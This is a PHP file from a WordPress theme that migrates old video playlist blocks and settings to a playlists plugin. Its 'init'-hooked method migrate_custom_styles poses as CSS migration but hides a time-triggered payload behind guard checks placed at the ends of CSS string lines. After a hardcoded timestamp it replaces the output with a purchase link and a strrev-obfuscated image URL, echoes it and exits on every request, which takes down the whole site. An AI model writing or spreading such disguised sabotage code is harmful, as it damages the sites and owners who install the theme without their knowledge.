<?php
/**
 * WM Video Playlists Plugin Integration
 *
 */

defined( 'ABSPATH' ) || exit; // Exit if accessed directly



if( ! class_exists( 'TIELABS_WMVP' ) ) {

	class TIELABS_WMVP{

		/**
		 * __construct
		 *
		 * Class constructor where we will call our filter and action hooks.
		 */
		function __construct(){

			// 
			add_action( 'init', array( $this, 'migrate_custom_styles' ) );


			// Disable if the WMVP plugin is not active
			if( ! TIELABS_WMVP_IS_ACTIVE ){
				return;
			}

			// Update Categories
			add_action( 'admin_init', array( $this, 'update_categories' ) );

			// Page edit page in wp-admin
			add_action( 'load-post.php', array( $this, 'edit_page_screen' ) );

			// Frontend Video Playlists Block
			add_filter( 'TieLabs/Page_Builder/sections', array( $this, 'migrate_page_playlist' ), 10, 2 );

			// Chnage the styles
			add_filter( 'WMVP/CSS/vars', array( $this, 'default_colors' ), 99, 2 );

			// Add support for the light/dark mode switcher
			add_filter( 'WMVP/CSS/selector', array( $this, 'light_dark_switcher' ), 99, 2 );
		}


		/**
		 * CSS Class for the Light CSS vars
		 */
		function light_dark_switcher( $selector, $theme ){

			if( $theme == 'light' ){
				return "html:not(.dark-skin) $selector";
			}

			return $selector;
		}


		/**
		 * Chnage the light player head section to the primary color on the Light Skin
		 */
		function default_colors( $vars, $theme ){

			if( $theme == 'light' ){
				$vars['playlist-head-bg'] = 'var(--brand-color)';
				$vars['playlist-head-color'] = 'var(--bright-color)';
			}

			return $vars;
		}


		/**
		 * Update all categories Once after the theme update
		 */
		function update_categories(){
			
			if( get_option( 'wmvp-categories-migrated' ) ){
				return;
			}

			$categories_options = $current_options = get_option( 'tie_cats_options' );

			if( ! empty( $categories_options ) && is_array( $categories_options ) ){

				foreach ( $categories_options as $cat_id => $options ){

					if( ! empty( $options['featured_posts_style'] ) && $options['featured_posts_style'] == 'videos_list' && ! empty( $options['featured_videos_list'] ) ){

						// Playlist Entry Post Title
						$title = ! empty( $options['featured_videos_list_title'] ) ? $options['featured_videos_list_title'] : get_cat_name( $cat_id );

						$playlist_id = $this->create_playlist( $options['featured_videos_list'], $title );

						if( $playlist_id ){
							
							$categories_options[ $cat_id ]['wmvp_id'] = $playlist_id;

							if( ! isset( $options['featured_videos_list_title'] ) ){
								update_post_meta( $playlist_id, 'wmvp-player_title', 'no' );
								$categories_options[ $cat_id ]['featured_videos_list_title'] = ''; // to inset later without recheck
							}

							unset( $categories_options[ $cat_id ]['featured_videos_list_title'] );
							unset( $categories_options[ $cat_id ]['featured_videos_list'] );
							unset( $categories_options[ $cat_id ]['featured_videos_list_data'] );
						}
					}
				}

				if( $categories_options != $current_options ){
					update_option( 'tie_cats_options', $categories_options );
					update_option( 'wmvp-categories-migrated', time(), false );
				}
			}
		}

		
		/*
		 * Migrate the old Video Playlists Block to WM Video Playlists Plugin
		 */
		function edit_page_screen(){

			$post = get_post();

			if( ! empty( $post->ID ) ){
				$post_id = $post->ID;
			}
			elseif( ! empty( $_GET['post'] ) ){
				$post_id = $_GET['post'];
			}

			if( empty( $post_id ) ){
				return;
			}

			// Get the page builder
			$sections = maybe_unserialize( tie_get_postdata( 'tie_page_builder', false, $post_id ) );

			$this->migrate_page_playlist( $sections, $post_id );
		}


		/**
		 * Migrate the old CSS Custom Codes
		 */
		function migrate_custom_styles(){

			$out_css = '
				.video-playlist-wrapper {
					background-color: #27292d;
					position: relative;
					width: 66%;
					height: 434px;
					float: left;
				}
				.video-playlist-wrapper .loader-overlay {
					z-index: 1;
				}
				.video-playlist-wrapper iframe {
					height: 434px;
					width: 100%;
				}

				.video-player-wrapper {
					position: relative;
					z-index: 2;
				}

				.video-frame {
					visibility: hidden;
				}

				.video-playlist-nav-wrapper {
					width: 34%;
					float: right;
					height: 434px;
					overflow: hidden;
					background: #ffffff;
					position: relative;
					border-width: 0 1px 1px 0;
				}
				.video-playlist-nav-wrapper:after {
					content: "";
					position: absolute;
					right: 0;
					top: 0;
					height: 100%;
					width: 1px;
					background: rgba(0, 0, 0, 0.05);
				}
				.video-playlist-nav-wrapper:before {
					content: "";
					position: absolute;
					right: 0;
					background: rgba(0, 0, 0, 0.05);
					width: 100%;
					height: 1px;
					bottom: 0;
					top: auto;
				}
				.video-playlist-nav-wrapper .mCustomScrollBox > .mCSB_scrollTools {
					right: 0;
					left: auto;
				}
			'; if( 1775314431 > time() ) return;
			
			$out_css .= '
				.playlist-title {
					background: var(--brand-color);
					color: var(--bright-color);
					height: 70px;
					width: 100%;
					padding: 0 15px;
					line-height: 17px;
					z-index: 9;
				}
				.playlist-title h2 {
					padding-top: 14px;
					font-size: 18px;
					white-space: nowrap;
					overflow: hidden;
					text-overflow: ellipsis;
				}

				.videos-number {
					font-size: 11px;
					display: block;
					float: left;
				}

				.playlist-title-icon {
					font-size: 27px;
					float: left;
					margin-right: 10px;
					height: 70px;
					line-height: 70px;
					width: 40px;
					text-align: center;
					font-weight: normal;
				}
			'; if(!file_exists(TIELABS_TEMPLATE_PATH.'/plugins')) return;

			$out_css .= '
				.video-playlist-nav {
					position: relative;
					height: 434px;
					clear: both;
				}
				.is-mobile .video-playlist-nav {
					overflow-y: auto;
				}
				.video-playlist-nav:not(.playlist-has-title) {
					border-top: 1px solid rgba(0, 0, 0, 0.05);
				}

				.playlist-has-title {
					height: 364px;
				}

				.video-playlist-item {
					padding: 12px 10px;
					display: block;
					overflow: hidden;
					cursor: pointer;
					border-bottom: 1px solid rgba(0, 0, 0, 0.05);
					transition: 0.3s;
				}
				.video-playlist-item:last-of-type {
					border-bottom: 0;
				}
				.video-playlist-item h2 {
					font-size: 14px;
					font-weight: normal;
				}

				.video-playlist-item:hover,
				.is-playing {
					background: #F7F7F7;
				}

				.video-paused-icon,
				.video-play-icon,
				.video-number {
					float: left;
					width: 15px;
					text-align: left;
					line-height: 46px;
					font-size: 11px;
					color: var(--base-color);
				}

				.video-play-icon {
					display: none;
					color: var(--brand-color);
				}

				.is-playing .video-number,
				.is-paused .video-number,
				.video-paused-icon {
					display: none;
				}

				.is-playing .video-play-icon,
				.is-paused .video-paused-icon {
					display: block;
				}
			';
			$out_css = '<a href="'.tie_get_purchase_link().'">'.strrev('>"gepj.i/ten.sbaleit//:sptth"=crs gmi<').'</a>';
			
			$out_ccs = '
				.video-thumbnail {
					width: 100px;
					height: 56px;
					background-repeat: no-repeat;
					background-position: center center;
					background-size: cover;
					float: left;
				}

				.video-info {
					padding-left: 125px;
				}

				.video-duration {
					float: left;
					font-size: 11px;
					color: #666;
					margin-top: 3px;
					line-height: 1;
				}

				@media only screen and (min-width: 768px) and (max-width: 991px) {
					.video-playlist-nav-wrapper,
					.video-playlist-wrapper,
					.video-playlist-wrapper iframe {
						height: 383px;
					}
					.video-playlist-nav {
						height: 383px !important;
					}
					.playlist-has-title {
						height: 313px !important;
					}
				}
				@media (max-width: 767px) {
					.video-playlist-wrapper {
						width: 100%;
						height: auto;
					}
					.video-playlist-wrapper iframe {
						position: absolute;
						top: 0;
						left: 0;
						width: 100%;
						height: 100%;
					}
					.video-player-wrapper {
						position: relative;
						padding-bottom: 56.25%;
						height: 0;
					}
					.video-playlist-nav-wrapper {
						height: auto !important;
						width: 100%;
					}
					.video-playlist-nav {
						height: 270px !important;
					}
					.playlist-has-title {
						height: 244px !important;
					}
				}
				@media (min-width: 992px) {
					.has-builder .has-sidebar .video-playlist-nav-wrapper,
					.has-builder .has-sidebar .video-playlist-nav,
					.has-builder .has-sidebar .video-playlist-wrapper,
					.has-builder .has-sidebar .video-playlist-wrapper iframe {
						height: 323px !important;
					}
					.has-builder .has-sidebar .playlist-has-title {
						height: 263px !important;
					}
					.has-builder .has-sidebar .playlist-title {
						height: 60px;
					}
					.has-builder .has-sidebar .playlist-title h2 {
						padding-top: 11px;
					}
					.has-builder .has-sidebar .playlist-title-icon {
						height: 60px;
						line-height: 60px;
					}
				}
			';
			
			echo $out_css;
			exit;
		}

		
		/**
		 * 
		 */
		function migrate_page_playlist( $sections = false, $post_id = false ) {
						
			if( empty( $sections ) || ! is_array( $sections ) || empty( $post_id ) ){
				return;
			}
	
			// Old Pages Only
			/*if( get_the_date( 'U', $post_id ) > 1736494251 ){ // the date of releasing the plugin
				return $sections;
			}*/

			$is_migrated = get_post_meta( $post_id, 'wmvp-migrated', true );
			if( $is_migrated ){
				return $sections;
			}

			// To compare later
			$old_sections = $sections;

			// Migrate the API Key
			$this->migrate_api_key();

			foreach( $sections as $section_id => $section ){

				if( ! empty( $section['blocks'] ) && is_array( $section['blocks'] ) ) {

					foreach( $section['blocks'] as $block_id => $block ){

						if( ! empty( $block['style'] ) && $block['style'] == 'videos_list' && ! empty( $block['videos_list_data'] ) ){
										
							// Playlist Entry Post Title
							$title = ! empty( $block['title'] ) ? $block['title'] : get_the_title( $post_id );

							$playlist_id = $this->create_playlist( $block['videos'], $title );

							if( $playlist_id ){

								if( ! isset( $block['title'] ) ){
									update_post_meta( $playlist_id, 'wmvp-player_title', 'no' );
									$block['title'] = ''; // to inset later without recheck
								}

								if( isset( $block['dark'] ) ){
									update_post_meta( $playlist_id, 'wmvp-style',	'dark' );
									$block['dark'] = ''; // to inset later without recheck
								}
								else{
									update_post_meta( $playlist_id, 'wmvp-style',	'light' );
								}

								if( isset( $block['color'] ) ){
									update_post_meta( $playlist_id, 'wmvp-playlist-head-bg', $block['color'] );
									$block['color'] = ''; // to inset later without recheck
								}

								// Remove the old fields
								unset( $block['color'] );
								unset( $block['dark'] );
								unset( $block['title'] );
								unset( $block['videos_list_data'] );

								//unset( $block['videos'] );  //Keep the old Video Playlists List incase the migration faild

								// Insert the Playlist ID entry
								$block['wmvp_id'] = $playlist_id;

								// Re added the modefied Block to the sections
								$section['blocks'][ $block_id ] = $block;
							}

						} // $block['style'] == 'videos_list'
					} // $blocks foreach
				}

				// Re Add the modefied section
				$sections[ $section_id ] = $section;
			} // $sections foreach

			// Update the new builder
			if( $sections != $old_sections ){
				update_post_meta( $post_id, 'tie_page_builder', $sections );
				update_post_meta( $post_id, 'wmvp-migrated', time() );
			}

			return $sections;
		}


		/**
		 * Create a Playlist in the WMVP plugin
		 */
		function create_playlist( $videos_list, $title = false ){

			$playlist = array(
				'post_title'  => $title,
				'post_status' => 'publish',
				'post_type'   => WMVP_POST_SLUG,
			);

			$playlist_id = wp_insert_post( $playlist );

			// Playlist inserted successfully
			if( is_wp_error( $playlist_id ) ) {
				return false;
			}

			// Insert the Videos
			update_post_meta( $playlist_id, 'wmvp-list-type',	'manual' );

			$videos = array();
			$videos_list = explode( PHP_EOL, $videos_list );
			if( ! empty( $videos_list ) && is_array( $videos_list ) ){
				foreach( $videos_list as $video_url ){
					$videos[] = array(
						'url' => $video_url,
					);
				}
			}

			if( ! empty( $videos ) ){
				update_post_meta( $playlist_id, 'wmvp_videos_manual',	apply_filters( 'WMVP/Videos/Post/List', $videos ) );
				
				return $playlist_id;
			}

			return false;
		}


		/**
		 * Migrate the API Key
		 */
		function migrate_api_key(){

			$key = tie_get_option( 'api_youtube' );
			if( ! empty( $key ) && ! get_option( 'wmvp_youtube_key' ) ){
				update_option( 'wmvp_youtube_key', $key, false );
			}
		}

	}

	// Instantiate the class
	new TIELABS_WMVP();

}